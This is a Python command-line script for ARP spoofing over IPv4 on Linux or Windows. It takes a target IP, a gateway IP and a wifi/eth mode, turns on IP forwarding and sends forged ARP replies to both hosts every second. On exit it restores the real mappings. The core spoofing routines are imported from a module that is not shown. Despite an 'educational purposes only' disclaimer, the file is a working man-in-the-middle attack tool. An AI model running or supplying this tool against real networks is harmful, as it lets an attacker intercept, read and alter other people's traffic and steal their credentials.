from spoofing_services import *
from argparse import *
import time
import sys
import platform


def parse_args():

    if len(sys.argv) == 1:
        sys.argv.append("-h")
        sys.argv.append("-v")

    program_name = "Arp_Spoofer.py"
    program_desc = '''
    Code for basic ARP SPOOFING over IPv4. Supports Linux and Windows. Can be done over ethernet or WIFI connection.
    For educational puposes only. Use this on a controlled environment. DO NOT USE THIS FOR MALICIOUS PURPOSES!!!
    '''

    try:
        parser = ArgumentParser(description=program_desc)
        parser.add_argument('-t', '--target', dest='target_ip', type=str, help="Target IP address", required=True)
        parser.add_argument('-g', '--gateway', dest='gateway_ip', type=str, help="Gateway IP address", required=True)
        parser.add_argument('-c', '--connection', dest='con_mode', type=str, help="Connection mode [wifi or eth]", required=True)

    except KeyboardInterrupt:
        exit()
    except Exception as e:
        sys.stderr.write(f"{program_name}: {repr(e)}")
        sys.stderr.write("      For help, use -h or --help.")
        exit()
    
    return parser.parse_args()


def main():
    os = platform.system()
    args = parse_args()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    con_mode = args.con_mode

    enableIPRoute(os)

    try:
        spoofer = Spoofer(con_mode)
        while True:
            spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
            spoofer.spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
            time.sleep(1)
    except KeyboardInterrupt:
        print("Restoring the network, please wait...")
        spoofer.unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
        spoofer.unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
        disableIPRoute(os)

if __name__ == "__main__":
    main()


    